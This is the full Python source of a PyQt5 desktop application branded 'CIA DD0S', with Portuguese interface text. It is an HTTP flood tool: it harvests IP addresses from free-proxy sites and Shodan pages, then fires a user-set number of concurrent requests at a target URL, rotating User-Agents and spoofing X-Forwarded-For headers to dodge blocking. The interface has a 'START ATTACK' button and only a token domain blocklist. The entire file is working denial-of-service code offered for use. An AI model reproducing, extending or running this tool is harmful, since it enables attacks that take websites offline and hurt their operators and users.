import sys
import requests
import asyncio
import aiohttp
import random
import re
import itertools
import os
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QWidget, QLabel,
    QLineEdit, QPushButton, QMessageBox, QTextEdit
)
from PyQt5.QtGui import QPixmap, QPalette, QColor
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from io import BytesIO
import httpx

UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux i645 ) AppleWebKit/601.39 (KHTML, like Gecko) Chrome/52.0.1303.178 Safari/600",     
    "Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/603.16 (KHTML, like Gecko) Chrome/49.0.3596.149 Safari/602",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_8) AppleWebKit/537.8 (KHTML, like Gecko) Chrome/51.0.3447.202 Safari/533",
    "Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/54.0.2790.274 Safari/601",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_1) AppleWebKit/534.29 (KHTML, like Gecko) Chrome/54.0.2941.340 Safari/602",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_4_2) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/47.0.1755.159 Safari/600",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_4; like Mac OS X) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/47.0.1661.149 Mobile Safari/536.4",
    "Mozilla/5.0 (Linux; Android 5.1; SM-G9350T Build/LMY47X) AppleWebKit/602.21 (KHTML, like Gecko)  Chrome/50.0.1176.329 Mobile Safari/535.9",
    "Mozilla/5.0 (Linux; U; Android 6.0.1; HTC One M8 Build/MRA58K) AppleWebKit/600.36 (KHTML, like Gecko)  Chrome/53.0.3363.154 Mobile Safari/537.2",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_8_3) Gecko/20100101 Firefox/50.7",
    "Mozilla/5.0 (U; Linux i671 x86_64) AppleWebKit/535.27 (KHTML, like Gecko) Chrome/54.0.1417.286 Safari/537",
    "Mozilla/5.0 (iPad; CPU iPad OS 9_4_4 like Mac OS X) AppleWebKit/536.12 (KHTML, like Gecko)  Chrome/55.0.1687.155 Mobile Safari/600.8",
    "Mozilla/5.0 (Linux; Android 4.4.1; LG-V510 Build/KOT49I) AppleWebKit/535.28 (KHTML, like Gecko)  Chrome/52.0.2705.296 Mobile Safari/602.9",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/54.0.2084.216 Safari/603.3 Edge/8.91691",
    "Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; WOW64; en-US Trident/7.0)",
]

ip_list_urls = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.shodan.io/search?query=brazil",
    "https://www.shodan.io/search?query=germany",
    "https://www.shodan.io/search?query=france",
    "https://www.shodan.io/search?query=USA",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://geonode.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.shodan.io/search?query=brazil",
    "https://www.shodan.io/search?query=germany",
    "https://www.shodan.io/search?query=france",
    "https://www.shodan.io/search?query=USA",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://geonode.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://www.freeproxy.world/?type=&anonymity=&country=&speed=&port=&page=1#google_vignette",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.shodan.io/search?query=brazil",
    "https://www.shodan.io/search?query=germany",
    "https://www.shodan.io/search?query=france",
    "https://www.shodan.io/search?query=USA",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://geonode.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/anonymous-proxies/",
]

class AttackThread(QThread):
    log_signal = pyqtSignal(str)  

    def __init__(self, target_url, num_requests):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests

    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url) as response:
                    text = await response.text()
                    ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", text)
                    return ip_addresses
            except Exception as e:
                self.log_signal.emit(f"Error fetching IP list from {url}: {e}")
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(url) for url in ip_list_urls]
        ip_lists = await asyncio.gather(*tasks)
        all_ips = [ip for sublist in ip_lists for ip in sublist]
        return all_ips

    async def send_request(self, session, ip_address):
        headers = {
            "User-Agent": random.choice(UserAgents),
            "X-Forwarded-For": ip_address
        }
        try:
            async with session.get(self.target_url, headers=headers) as response:
                self.log_signal.emit(f"CIA@root {self.target_url} from IP: {ip_address} - Status: {response.status}")
        except Exception as e:
            self.log_signal.emit(f"Error sending request from IP: {ip_address} - {e}")

    async def attack(self):
        ip_list = await self.get_all_ips()
        ip_cycle = itertools.cycle(ip_list)
        async with aiohttp.ClientSession() as session:
            tasks = [self.send_request(session, next(ip_cycle)) for _ in range(self.num_requests)]
            await asyncio.gather(*tasks)

    def run(self):
        asyncio.run(self.attack())

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("CIA DD0S")
        self.setGeometry(200, 200, 600, 600)
        self.setStyleSheet("""
            QMainWindow { 
                background-color: #001a33; /* Azul escuro em vez de preto */
                border-radius: 2px;
            }
            QLabel {
                color: white;
            }
            QPushButton {
                background-color: #003366; /* Azul mais escuro para botões */
                color: white;
                border: 1px solid #0055a5;
                padding: 5px;
                border-radius: 3px;
            }
            QPushButton:hover {
                background-color: #004488;
            }
            QLineEdit {
                background-color: #002244;
                color: white;
                border: 1px solid #0055a5;
                padding: 5px;
                border-radius: 3px;
            }
        """)

        central_widget = QWidget()
        self.setCentralWidget(central_widget)

        layout = QVBoxLayout()

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("""
            background-color: #001122; /* Azul muito escuro para o log */
            color: #00ff00; 
            font-family: 'Courier New';
            border: 1px solid #003366;
            padding: 10px;
        """)
        layout.addWidget(self.log_output)

        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignCenter)
        self.image_label.setStyleSheet("""
            background-color: #002244; /* Azul escuro em vez de preto */
            border: 2px solid #003366;
            border-radius: 5px;
        """)
        layout.addWidget(self.image_label)
        
        # Carregar imagem local
        self.load_local_image("core/img.png")

        self.url_label = QLabel("INSIRA O URL:")
        self.url_label.setAlignment(Qt.AlignCenter)  
        self.url_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #ffffff;")
        layout.addWidget(self.url_label)

        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("http://www.exemplodaloja.com.br")
        self.url_input.setFixedWidth(400)
        layout.addWidget(self.url_input, alignment=Qt.AlignCenter)

        self.requests_label = QLabel("Número de requisições:")
        self.requests_label.setAlignment(Qt.AlignCenter)
        self.requests_label.setStyleSheet("font-size: 14px; font-weight: bold; color: #ffffff;")
        layout.addWidget(self.requests_label)

        self.requests_input = QLineEdit()
        self.requests_input.setPlaceholderText("e.g., 1000")
        self.requests_input.setFixedWidth(400)
        layout.addWidget(self.requests_input, alignment=Qt.AlignCenter)

        self.start_button = QPushButton("START ATTACK")
        self.start_button.setFixedWidth(200)
        self.start_button.setFixedHeight(40)
        self.start_button.setStyleSheet("""
            QPushButton {
                background-color: #ff0000;
                color: white;
                font-weight: bold;
                font-size: 14px;
                border: 2px solid #cc0000;
                border-radius: 5px;
            }
            QPushButton:hover {
                background-color: #cc0000;
            }
            QPushButton:pressed {
                background-color: #990000;
            }
        """)
        self.start_button.clicked.connect(self.start_attack)
        layout.addWidget(self.start_button, alignment=Qt.AlignCenter)

        central_widget.setLayout(layout)

    def log_message(self, message):
        self.log_output.append(message)

    def load_local_image(self, image_path):
        """Carrega imagem do sistema de arquivos local"""
        try:
            # Verifica se o arquivo existe
            if not os.path.exists(image_path):
                # Tenta caminhos alternativos
                alt_paths = [
                    image_path,
                    "./" + image_path,
                    "../" + image_path,
                    os.path.join(os.path.dirname(__file__), image_path)
                ]
                
                for path in alt_paths:
                    if os.path.exists(path):
                        image_path = path
                        break
                else:
                    self.log_message(f"❌ Image not found: {image_path}")
                    self.create_fallback_banner()
                    return
            
            # Carrega a imagem
            pixmap = QPixmap(image_path)
            
            if pixmap.isNull():
                self.log_message(f"❌ Failed to load image: {image_path}")
                self.create_fallback_banner()
                return
            
            # Ajusta tamanho mantendo proporção
            scaled_pixmap = pixmap.scaled(
                500, 300, 
                Qt.KeepAspectRatio, 
                Qt.SmoothTransformation
            )
            
            self.image_label.setPixmap(scaled_pixmap)
            self.log_message(f"")
            
        except Exception as e:
            self.log_message(f"")
            self.create_fallback_banner()

    def create_fallback_banner(self):
        """Cria um banner alternativo se a imagem falhar"""
        self.image_label.setText("CIA \nDDoS TOOL")
        self.image_label.setStyleSheet("""
            background-color: #002244; /* Azul escuro em vez de preto */
            color: #ff0000; 
            border: 2px solid #ff0000;
            font-size: 24px;
            font-weight: bold;
            font-family: 'Courier New';
            border-radius: 5px;
        """)
        self.image_label.setAlignment(Qt.AlignCenter)

    def start_attack(self):
        target_url = self.url_input.text().strip()
        
        if not target_url:
            QMessageBox.warning(self, "Warning", "Please enter a target URL")
            return
            
        try:
            num_requests = int(self.requests_input.text().strip())
            if num_requests <= 0:
                raise ValueError
        except ValueError:
            QMessageBox.warning(self, "Warning", "Please enter a valid number of requests")
            return

        # Adiciona http:// se não tiver protocolo
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
            self.url_input.setText(target_url)

        # Validações básicas de segurança (bloqueia sites importantes)
        blocked_domains = ['google.com', 'facebook.com', 'gov.br', 'github.com']
        for domain in blocked_domains:
            if domain in target_url:
                QMessageBox.critical(self, "Error", f"Cannot target {domain}")
                return

        self.log_message(f"Starting attack on: {target_url}")
        self.log_message(f"Number of requests: {num_requests}")
        self.log_message("─" * 50)

        self.attack_thread = AttackThread(target_url, num_requests)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        
        QMessageBox.information(self, "CIA DD0S", "Attack started! Check logs.")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())